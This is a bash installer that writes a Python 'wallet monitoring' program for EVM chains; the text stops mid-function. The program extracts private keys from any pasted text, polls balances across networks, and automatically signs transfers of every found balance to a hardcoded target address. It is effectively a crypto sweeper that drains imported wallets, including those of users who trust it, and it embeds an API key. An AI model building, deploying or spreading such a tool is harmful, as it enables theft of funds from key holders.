#!/bin/bash

# 钱包监控系统完整安装脚本 v4.0 - 完整网络支持版
# 支持所有Alchemy网络，智能并发优化，完美交互体验

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}🚀 钱包监控系统完整安装器 v4.0 - 完整网络支持版${NC}"
echo -e "${BLUE}支持所有Alchemy网络，智能并发优化，完美交互体验${NC}"
echo "========================================="

# 检测操作系统
echo -e "${CYAN}📋 检查操作系统...${NC}"
OS_TYPE=$(uname -s)
case "$OS_TYPE" in
    Linux*)  OS="Linux";;
    Darwin*) OS="macOS";;
    CYGWIN*|MINGW*|MSYS*) OS="Windows";;
    *) OS="Unknown";;
esac
echo -e "${GREEN}✅ 检测到 $OS 系统${NC}"

# 检测Python - 简化版本
echo -e "${CYAN}📋 检查Python...${NC}"
PYTHON_CMD=""
if command -v python3 &> /dev/null; then
    PY_VERSION=$(python3 --version 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
    MAJOR=$(echo $PY_VERSION | cut -d. -f1)
    MINOR=$(echo $PY_VERSION | cut -d. -f2)
    if [[ $MAJOR -ge 3 && $MINOR -ge 8 ]]; then
        PYTHON_CMD="python3"
        echo -e "${GREEN}✅ Python: python3 (版本 $PY_VERSION)${NC}"
    fi
elif command -v python &> /dev/null; then
    PY_VERSION=$(python --version 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
    MAJOR=$(echo $PY_VERSION | cut -d. -f1)
    MINOR=$(echo $PY_VERSION | cut -d. -f2)
    if [[ $MAJOR -ge 3 && $MINOR -ge 8 ]]; then
        PYTHON_CMD="python"
        echo -e "${GREEN}✅ Python: python (版本 $PY_VERSION)${NC}"
    fi
fi

if [[ -z "$PYTHON_CMD" ]]; then
    echo -e "${RED}❌ 未找到Python 3.8+${NC}"
    echo -e "${YELLOW}💡 请安装Python 3.8或更高版本${NC}"
    exit 1
fi

# 检测pip
echo -e "${CYAN}📋 检查pip...${NC}"
if ! $PYTHON_CMD -m pip --version &> /dev/null; then
    echo -e "${RED}❌ pip不可用${NC}"
    echo -e "${YELLOW}💡 请安装pip${NC}"
    exit 1
fi
echo -e "${GREEN}✅ pip可用${NC}"

# 智能缓存清理函数
clean_cache() {
    echo -e "${CYAN}🧹 智能清理缓存和临时文件...${NC}"
    
    # 清理pip缓存
    $PYTHON_CMD -m pip cache purge 2>/dev/null || true
    
    # 清理Python字节码缓存
    find . -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null || true
    find . -name "*.pyc" -delete 2>/dev/null || true
    find . -name "*.pyo" -delete 2>/dev/null || true
    
    # 清理临时文件
    rm -f .wallet_monitor_temp_* 2>/dev/null || true
    rm -f wallet_monitor_backup_* 2>/dev/null || true
    rm -f temp_wallet_content.txt 2>/dev/null || true
    
    # 清理系统临时目录中的相关文件
    rm -rf /tmp/wallet_monitor_* 2>/dev/null || true
    rm -rf /tmp/final_working_test 2>/dev/null || true
    rm -rf /tmp/bug_fix_test 2>/dev/null || true
    rm -rf /tmp/speed_test 2>/dev/null || true
    rm -rf /tmp/smart_test 2>/dev/null || true
    
    echo -e "${GREEN}✅ 缓存和临时文件清理完成${NC}"
}

# 智能文件完整性检查
check_file_integrity() {
    local file="$1"
    local expected_marker="$2"
    
    if [[ -f "$file" ]]; then
        if grep -q "$expected_marker" "$file" 2>/dev/null; then
            return 0  # 文件存在且内容正确
        fi
    fi
    return 1  # 文件不存在或内容不正确
}

# 智能依赖安装
install_dependencies() {
    echo -e "${CYAN}📦 智能安装依赖...${NC}"
    
    # 依赖列表
    DEPENDENCIES=(
        "web3"
        "eth-account" 
        "alchemy-sdk"
        "colorama"
        "aiohttp"
        "cryptography"
        "dataclass-wizard"
    )
    
    # 检查已安装的包
    MISSING_DEPS=()
    for dep in "${DEPENDENCIES[@]}"; do
        if ! $PYTHON_CMD -c "import ${dep//-/_}" 2>/dev/null; then
            MISSING_DEPS+=("$dep")
        fi
    done
    
    if [[ ${#MISSING_DEPS[@]} -eq 0 ]]; then
        echo -e "${GREEN}✅ 所有依赖已安装${NC}"
        return 0
    fi
    
    echo -e "${YELLOW}📋 需要安装: ${MISSING_DEPS[*]}${NC}"
    
    # 多策略安装
    for dep in "${MISSING_DEPS[@]}"; do
        echo -e "${CYAN}安装 $dep...${NC}"
        
        # 策略1: 标准安装
        if $PYTHON_CMD -m pip install "$dep" &>/dev/null; then
            echo -e "${GREEN}✅ $dep 安装成功 (标准)${NC}"
            continue
        fi
        
        # 策略2: 用户安装
        if $PYTHON_CMD -m pip install --user "$dep" &>/dev/null; then
            echo -e "${GREEN}✅ $dep 安装成功 (用户)${NC}"
            continue
        fi
        
        # 策略3: 系统包安装 (macOS/Linux)
        if [[ "$OS" == "macOS" ]] || [[ "$OS" == "Linux" ]]; then
            if $PYTHON_CMD -m pip install --break-system-packages --user "$dep" &>/dev/null; then
                echo -e "${GREEN}✅ $dep 安装成功 (系统包)${NC}"
                continue
            fi
        fi
        
        echo -e "${RED}❌ $dep 安装失败${NC}"
    done
}

# 创建主程序文件（智能合并）
create_main_program() {
    if check_file_integrity "wallet_monitor.py" "钱包监控转账系统 v2.0"; then
        echo -e "${GREEN}✅ wallet_monitor.py 已存在且完整，跳过创建${NC}"
        return 0
    fi
    
    echo -e "${CYAN}📝 创建完整网络支持版主程序...${NC}"
    
    cat > wallet_monitor.py << 'MAIN_PROGRAM_EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
钱包监控转账系统 v2.0 - 完整网络支持版
支持Alchemy所有EVM兼容链的钱包监控和自动转账
优化API速度和菜单交互体验，包含所有支持的网络
"""

import os
import sys
import json
import asyncio
import time
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import concurrent.futures

# 自动安装依赖
def auto_install_dependencies():
    """自动检测并安装缺少的依赖"""
    required_packages = {
        'web3': 'web3',
        'eth_account': 'eth-account',
        'alchemy': 'alchemy-sdk',
        'colorama': 'colorama',
        'aiohttp': 'aiohttp',
        'cryptography': 'cryptography',
        'dataclass_wizard': 'dataclass-wizard'
    }
    
    missing_packages = []
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_name)
    
    if missing_packages:
        print(f"❌ 缺少必要的依赖包: {', '.join(missing_packages)}")
        print("💡 正在自动安装...")
        
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} 安装成功")
            except:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', package])
                    print(f"✅ {package} 安装成功 (用户模式)")
                except:
                    print(f"❌ {package} 安装失败")
                    return False
    return True

# 确保依赖可用
if not auto_install_dependencies():
    print("❌ 依赖安装失败，请手动安装")
    sys.exit(1)

# 导入依赖
try:
    from web3 import Web3
    from eth_account import Account
    from alchemy import Alchemy, Network
    from colorama import Fore, Style, init
    import aiohttp
    import cryptography
    
    # 初始化colorama
    init(autoreset=True)
    
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
    sys.exit(1)

# 配置
ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"

# 数据文件
WALLETS_FILE = "wallets.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "config.json"
NETWORK_STATUS_FILE = "network_status.json"

# Alchemy支持的所有EVM兼容链 - 完整列表
SUPPORTED_NETWORKS = {
    # === 主网 (优先级高) ===
    "eth_mainnet": Network.ETH_MAINNET,           # Ethereum 主网
    "matic_mainnet": Network.MATIC_MAINNET,       # Polygon 主网  
    "arb_mainnet": Network.ARB_MAINNET,           # Arbitrum 主网
    "opt_mainnet": Network.OPT_MAINNET,           # Optimism 主网
    "astar_mainnet": Network.ASTAR_MAINNET,       # Astar 主网
    
    # === 测试网 ===
    "eth_goerli": Network.ETH_GOERLI,             # Ethereum Goerli 测试网
    "matic_mumbai": Network.MATIC_MUMBAI,         # Polygon Mumbai 测试网
    "arb_goerli": Network.ARB_GOERLI,             # Arbitrum Goerli 测试网
    "opt_goerli": Network.OPT_GOERLI,             # Optimism Goerli 测试网
    "opt_kovan": Network.OPT_KOVAN,               # Optimism Kovan 测试网
}

# 网络名称映射 - 完整版
NETWORK_NAMES = {
    # === 主网 ===
    "eth_mainnet": "Ethereum 主网",
    "matic_mainnet": "Polygon 主网", 
    "arb_mainnet": "Arbitrum 主网",
    "opt_mainnet": "Optimism 主网",
    "astar_mainnet": "Astar 主网",
    
    # === 测试网 ===
    "eth_goerli": "Ethereum Goerli",
    "matic_mumbai": "Polygon Mumbai",
    "arb_goerli": "Arbitrum Goerli",
    "opt_goerli": "Optimism Goerli",
    "opt_kovan": "Optimism Kovan",
}

# 网络类型分类
MAINNET_NETWORKS = ["eth_mainnet", "matic_mainnet", "arb_mainnet", "opt_mainnet", "astar_mainnet"]
TESTNET_NETWORKS = ["eth_goerli", "matic_mumbai", "arb_goerli", "opt_goerli", "opt_kovan"]

# 网络优先级 (主网优先)
NETWORK_PRIORITY = {
    "eth_mainnet": 1,
    "matic_mainnet": 2,
    "arb_mainnet": 3,
    "opt_mainnet": 4,
    "astar_mainnet": 5,
    "eth_goerli": 6,
    "matic_mumbai": 7,
    "arb_goerli": 8,
    "opt_goerli": 9,
    "opt_kovan": 10,
}

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: List[str]
    last_checked: Dict[str, str]

@dataclass 
class NetworkStatus:
    """网络状态"""
    available: bool
    last_check: str
    error_count: int
    last_error: str

class WalletMonitor:
    """钱包监控器 - 完整网络支持版"""
    
    def __init__(self):
        self.wallets: List[WalletInfo] = []
        self.alchemy_clients: Dict[str, Alchemy] = {}
        self.monitoring_active = False
        self.network_status: Dict[str, NetworkStatus] = {}
        self.load_wallets()
        self.load_network_status()
        
    def initialize_clients(self):
        """并发初始化所有Alchemy客户端 - 优化版本"""
        print(f"\n{Fore.CYAN}🔧 并发初始化 {len(SUPPORTED_NETWORKS)} 个网络客户端...{Style.RESET_ALL}")
        
        def init_single_client(network_item):
            network_key, network = network_item
            try:
                # 创建客户端
                client = Alchemy(api_key=ALCHEMY_API_KEY, network=network)
                return network_key, client, True, None
            except Exception as e:
                return network_key, None, False, str(e)
        
        # 使用线程池并发初始化
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            # 按优先级排序
            sorted_networks = sorted(SUPPORTED_NETWORKS.items(), 
                                   key=lambda x: NETWORK_PRIORITY.get(x[0], 999))
            
            futures = [executor.submit(init_single_client, item) for item in sorted_networks]
            
            success_count = 0
            mainnet_count = 0
            testnet_count = 0
            
            for future in concurrent.futures.as_completed(futures):
                network_key, client, success, error = future.result()
                
                if success:
                    self.alchemy_clients[network_key] = client
                    self.network_status[network_key] = NetworkStatus(
                        available=True,
                        last_check=datetime.now().isoformat(),
                        error_count=0,
                        last_error=""
                    )
                    
                    # 分类统计
                    if network_key in MAINNET_NETWORKS:
                        mainnet_count += 1
                        print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (主网){Style.RESET_ALL}")
                    else:
                        testnet_count += 1
                        print(f"{Fore.CYAN}✅ {NETWORK_NAMES[network_key]} (测试网){Style.RESET_ALL}")
                    
                    success_count += 1
                else:
                    self.network_status[network_key] = NetworkStatus(
                        available=False,
                        last_check=datetime.now().isoformat(),
                        error_count=1,
                        last_error=error
                    )
                    print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} - {error[:50]}...{Style.RESET_ALL}")
        
        self.save_network_status()
        
        print(f"\n{Fore.GREEN}🎉 网络初始化完成!{Style.RESET_ALL}")
        print(f"  📊 总计: {success_count}/{len(SUPPORTED_NETWORKS)} 个网络可用")
        print(f"  🌐 主网: {mainnet_count}/{len(MAINNET_NETWORKS)} 个")
        print(f"  🧪 测试网: {testnet_count}/{len(TESTNET_NETWORKS)} 个")
    
    def load_network_status(self):
        """加载网络状态缓存"""
        if os.path.exists(NETWORK_STATUS_FILE):
            try:
                with open(NETWORK_STATUS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.network_status = {
                        k: NetworkStatus(**v) for k, v in data.items()
                    }
            except:
                self.network_status = {}
    
    def save_network_status(self):
        """保存网络状态"""
        try:
            data = {k: v.__dict__ for k, v in self.network_status.items()}
            with open(NETWORK_STATUS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    def load_wallets(self):
        """加载钱包数据"""
        if os.path.exists(WALLETS_FILE):
            try:
                with open(WALLETS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.wallets = [WalletInfo(**wallet) for wallet in data]
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ 加载钱包数据失败: {e}{Style.RESET_ALL}")
                self.wallets = []
    
    def save_wallets(self):
        """保存钱包数据"""
        try:
            data = [wallet.__dict__ for wallet in self.wallets]
            with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存钱包数据失败: {e}{Style.RESET_ALL}")
    
    def extract_private_keys(self, text: str) -> List[str]:
        """智能提取私钥 - 增强版本"""
        patterns = [
            r'0x[a-fA-F0-9]{64}',  # 带0x前缀的64位十六进制
            r'[a-fA-F0-9]{64}',    # 不带前缀的64位十六进制
        ]
        
        private_keys = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                key = match.lower()
                if not key.startswith('0x'):
                    key = '0x' + key
                
                try:
                    Account.from_key(key)
                    if key not in private_keys:
                        private_keys.append(key)
                except:
                    continue
        
        return private_keys
    
    def print_progress_bar(self, current: int, total: int, prefix: str = "进度", width: int = 40):
        """显示进度条 - 增强版本"""
        percent = int(100 * current / total)
        filled_length = int(width * current / total)
        bar = '█' * filled_length + '░' * (width - filled_length)
        
        # 添加颜色
        if percent < 30:
            color = Fore.RED
        elif percent < 70:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
            
        print(f"\r{color}{prefix}: [{bar}] {percent}% ({current}/{total}){Style.RESET_ALL}", 
              end='', flush=True)
    
    def import_private_keys_menu(self):
        """导入私钥菜单 - 完全优化版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📥 智能批量导入私钥系统{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 智能识别功能:{Style.RESET_ALL}")
        print("  ✓ 自动识别64位十六进制私钥")
        print("  ✓ 支持0x前缀和无前缀格式")
        print("  ✓ 从任意格式文本中智能提取")
        print("  ✓ 自动验证私钥有效性")
        print("  ✓ 智能去重，避免重复导入")
        
        print(f"\n{Fore.YELLOW}📋 操作指南:{Style.RESET_ALL}")
        print("  1️⃣ 粘贴包含私钥的文本内容")
        print("  2️⃣ 私钥可以混在其他内容中")
        print("  3️⃣ 双击回车键确认导入")
        print("  4️⃣ 输入 'q'、'quit' 或 'exit' 返回主菜单")
        
        collected_text = ""
        empty_line_count = 0
        line_count = 0
        
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📝 请粘贴私钥文本 (双击回车确认):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        while True:
            try:
                line = input()
                if line.strip().lower() in ['q', 'quit', 'exit']:
                    print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                    time.sleep(1)
                    return
                
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        break
                else:
                    empty_line_count = 0
                    collected_text += line + "\n"
                    line_count += 1
                    print(f"{Fore.GREEN}✓ 第{line_count}行已接收{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                return
        
        if not collected_text.strip():
            print(f"\n{Fore.YELLOW}⚠️ 未输入任何内容{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}🔍 正在智能分析文本内容...{Style.RESET_ALL}")
        time.sleep(0.5)  # 视觉效果
        
        private_keys = self.extract_private_keys(collected_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请确保私钥格式正确 (64位十六进制字符串){Style.RESET_ALL}")
            print(f"{Fore.CYAN}🔍 支持格式示例:{Style.RESET_ALL}")
            print(f"  • 0x1234567890abcdef... (带0x前缀)")
            print(f"  • 1234567890abcdef... (不带前缀)")
            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎉 发现 {len(private_keys)} 个有效私钥!{Style.RESET_ALL}")
        
        # 验证和处理私钥
        new_wallets = []
        existing_addresses = {wallet.address.lower() for wallet in self.wallets}
        
        print(f"\n{Fore.CYAN}🔄 正在验证私钥和生成地址...{Style.RESET_ALL}")
        for i, private_key in enumerate(private_keys, 1):
            self.print_progress_bar(i, len(private_keys), "验证进度")
            try:
                account = Account.from_key(private_key)
                address = account.address
                
                if address.lower() not in existing_addresses:
                    wallet_info = WalletInfo(
                        address=address,
                        private_key=private_key,
                        enabled_networks=list(SUPPORTED_NETWORKS.keys()),
                        last_checked={}
                    )
                    new_wallets.append(wallet_info)
                    existing_addresses.add(address.lower())
            except Exception as e:
                continue
        
        print()  # 换行
        
        # 显示结果
        if new_wallets:
            print(f"\n{Fore.GREEN}📋 新钱包预览 ({len(new_wallets)} 个):{Style.RESET_ALL}")
            for i, wallet in enumerate(new_wallets, 1):
                short_addr = f"{wallet.address[:10]}...{wallet.address[-8:]}"
                print(f"  {i:2d}. {short_addr}")
            
            existing_count = len(private_keys) - len(new_wallets)
            if existing_count > 0:
                print(f"\n{Fore.YELLOW}💡 跳过 {existing_count} 个已存在的钱包{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 导入摘要:{Style.RESET_ALL}")
            print(f"  🆕 新钱包: {len(new_wallets)} 个")
            print(f"  🔄 重复钱包: {existing_count} 个")
            print(f"  🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            confirm = input(f"\n{Fore.CYAN}确认导入这 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}")
            
            if confirm.lower() in ['y', 'yes']:
                self.wallets.extend(new_wallets)
                self.save_wallets()
                print(f"\n{Fore.GREEN}🎉 导入成功!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💼 当前总钱包数: {len(self.wallets)} 个{Style.RESET_ALL}")
                print(f"{Fore.GREEN}🌐 每个钱包支持: {len(SUPPORTED_NETWORKS)} 个网络{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}💡 所有私钥对应的钱包都已存在{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💼 当前钱包总数: {len(self.wallets)} 个{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    async def check_address_activity_optimized(self, address: str, network_key: str) -> bool:
        """优化的地址活动检查 - 最佳实践版本"""
        # 检查网络状态
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
            return False
            
        try:
            client = self.alchemy_clients.get(network_key)
            if not client:
                return False
            
            # 使用最新的async/await语法和超时控制
            async with asyncio.timeout(8):  # 8秒超时
                # 方法1: 检查发送的交易 (最快)
                try:
                    response = await client.core.get_asset_transfers(
                        from_address=address,
                        category=["external"],  # 只检查主要交易类型
                        max_count=1,           # 只需要1条记录
                        exclude_zero_value=True # 排除0值交易
                    )
                    
                    if response and hasattr(response, 'transfers') and len(response.transfers) > 0:
                        return True
                except Exception as e:
                    pass  # 继续尝试其他方法
                
                # 方法2: 检查接收的交易
                try:
                    response = await client.core.get_asset_transfers(
                        to_address=address,
                        category=["external"],
                        max_count=1,
                        exclude_zero_value=True
                    )
                    
                    if response and hasattr(response, 'transfers') and len(response.transfers) > 0:
                        return True
                except Exception as e:
                    pass
                
                # 方法3: 检查当前余额 (最后的检查)
                try:
                    balance = await client.core.get_balance(address)
                    return int(balance) > 0
                except Exception as e:
                    pass
                    
                return False
                
        except asyncio.TimeoutError:
            print(f"{Fore.YELLOW}⏰ {NETWORK_NAMES[network_key]} 检查超时{Style.RESET_ALL}")
            # 更新网络状态
            if network_key in self.network_status:
                self.network_status[network_key].error_count += 1
                self.network_status[network_key].last_error = "超时"
            return False
        except Exception as e:
            error_msg = str(e)
            
            # 智能错误分类和处理
            if "403" in error_msg or "Forbidden" in error_msg:
                print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} API访问被拒绝{Style.RESET_ALL}")
                self.network_status[network_key].available = False
                self.network_status[network_key].last_error = "API访问被拒绝"
            elif "Name or service not known" in error_msg or "Failed to resolve" in error_msg:
                print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} DNS解析失败{Style.RESET_ALL}")
                self.network_status[network_key].available = False
                self.network_status[network_key].last_error = "网络不可达"
            elif "Max retries exceeded" in error_msg:
                print(f"{Fore.YELLOW}🔄 {NETWORK_NAMES[network_key]} 网络超时{Style.RESET_ALL}")
                self.network_status[network_key].error_count += 1
                self.network_status[network_key].last_error = "网络超时"
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 检查失败: {error_msg[:30]}...{Style.RESET_ALL}")
                self.network_status[network_key].error_count += 1
                self.network_status[network_key].last_error = error_msg[:100]
            
            return False
    
    async def get_balance_optimized(self, address: str, network_key: str) -> float:
        """优化的余额获取 - 最佳实践版本"""
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
            return 0.0
            
        try:
            client = self.alchemy_clients.get(network_key)
            if not client:
                return 0.0
                
            async with asyncio.timeout(5):  # 5秒超时
                balance_wei = await client.core.get_balance(address)
                balance_eth = Web3.from_wei(int(balance_wei), 'ether')
                return float(balance_eth)
                
        except asyncio.TimeoutError:
            if network_key in self.network_status:
                self.network_status[network_key].error_count += 1
            return 0.0
        except Exception as e:
            return 0.0
    
    async def transfer_balance_optimized(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
        """优化的转账功能 - 最佳实践版本"""
        try:
            client = self.alchemy_clients.get(network_key)
            if not client:
                return False
                
            w3 = Web3()
            account = Account.from_key(wallet.private_key)
            
            # 并发获取交易参数
            async with asyncio.timeout(15):  # 15秒超时
                # 并发获取nonce和gas价格
                nonce_task = client.core.get_transaction_count(wallet.address)
                gas_price_task = client.core.get_gas_price()
                
                nonce, gas_price = await asyncio.gather(nonce_task, gas_price_task)
                
                # 计算gas费用
                gas_limit = 21000  # 标准转账
                gas_cost = int(gas_price) * gas_limit
                
                # 计算转账金额
                balance_wei = Web3.to_wei(balance, 'ether')
                transfer_amount = balance_wei - gas_cost
                
                if transfer_amount <= 0:
                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
                    return False
                
                # 构建交易
                transaction = {
                    'to': TARGET_ADDRESS,
                    'value': transfer_amount,
                    'gas': gas_limit,
                    'gasPrice': int(gas_price),
                    'nonce': int(nonce),
                }
                
                # 签名并发送交易
                signed_txn = account.sign_transaction(transaction)
                tx_hash = await client.core.send_raw_transaction(signed_txn.rawTransaction)
                
                # 记录转账
                log_entry = {
                    'timestamp': datetime.now().isoformat(),
                    'from_address': wallet.address,
                    'to_address': TARGET_ADDRESS,
                    'amount': float(Web3.from_wei(transfer_amount, 'ether')),
                    'network': network_key,
                    'network_name': NETWORK_NAMES[network_key],
                    'tx_hash': tx_hash.hex() if hasattr(tx_hash, 'hex') else str(tx_hash),
                    'gas_used': gas_cost,
                    'gas_price': int(gas_price)
                }
                
                self.log_transfer(log_entry)
                
                amount_str = f"{Web3.from_wei(transfer_amount, 'ether'):.6f}"
                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {amount_str} ETH{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📋 交易哈希: {log_entry['tx_hash']}{Style.RESET_ALL}")
                
                return True
                
        except asyncio.TimeoutError:
            print(f"{Fore.RED}⏰ {NETWORK_NAMES[network_key]} 转账超时{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
            return False
    
    def log_transfer(self, log_entry: Dict):
        """记录转账日志 - 增强版本"""
        logs = []
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        
        # 保持最新1000条记录
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        try:
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存转账日志失败: {e}{Style.RESET_ALL}")
    
    async def monitor_wallet_optimized(self, wallet: WalletInfo):
        """优化的钱包监控 - 完整版本"""
        short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
        print(f"\n{Fore.CYAN}🔍 检查钱包: {short_addr}{Style.RESET_ALL}")
        
        # 获取可用网络
        available_networks = [
            net for net in wallet.enabled_networks 
            if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
        ]
        
        if not available_networks:
            print(f"{Fore.YELLOW}⚠️ 没有可用的网络{Style.RESET_ALL}")
            return
        
        # 按优先级排序 (主网优先)
        available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
        
        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个网络活动...{Style.RESET_ALL}")
        
        # 并发检查网络活动
        async def check_network_activity(network_key):
            has_activity = await self.check_address_activity_optimized(wallet.address, network_key)
            return network_key if has_activity else None
        
        # 限制并发数，避免API限制
        semaphore = asyncio.Semaphore(3)
        
        async def check_with_limit(network_key):
            async with semaphore:
                return await check_network_activity(network_key)
        
        # 执行并发检查
        tasks = [check_with_limit(net) for net in available_networks]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 处理结果
        active_networks = []
        for i, result in enumerate(results):
            network_key = available_networks[i]
            if result and not isinstance(result, Exception):
                active_networks.append(result)
                network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} ({network_type}){Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 跳过{Style.RESET_ALL}")
        
        if not active_networks:
            print(f"{Fore.YELLOW}💡 钱包在所有网络都无活动记录{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 开始监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
        
        # 持续监控余额
        check_count = 0
        while self.monitoring_active:
            check_count += 1
            print(f"\n{Fore.CYAN}🔄 第{check_count}次检查 - {short_addr}{Style.RESET_ALL}")
            
            for network_key in active_networks:
                try:
                    balance = await self.get_balance_optimized(wallet.address, network_key)
                    
                    if balance > 0:
                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}💵 余额: {balance:.8f} ETH{Style.RESET_ALL}")
                        
                        # 自动转账
                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
                        
                        if success:
                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
                
                except Exception as e:
                    continue
            
            # 智能等待间隔
            await asyncio.sleep(30)  # 30秒检查一次
    
    async def start_monitoring(self):
        """开始监控所有钱包 - 完全优化版本"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
        
        self.monitoring_active = True
        
        # 限制并发监控数量，优化性能
        semaphore = asyncio.Semaphore(2)  # 最多2个钱包并发监控
        
        async def monitor_with_limit(wallet):
            async with semaphore:
                await self.monitor_wallet_optimized(wallet)
        
        # 创建监控任务
        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
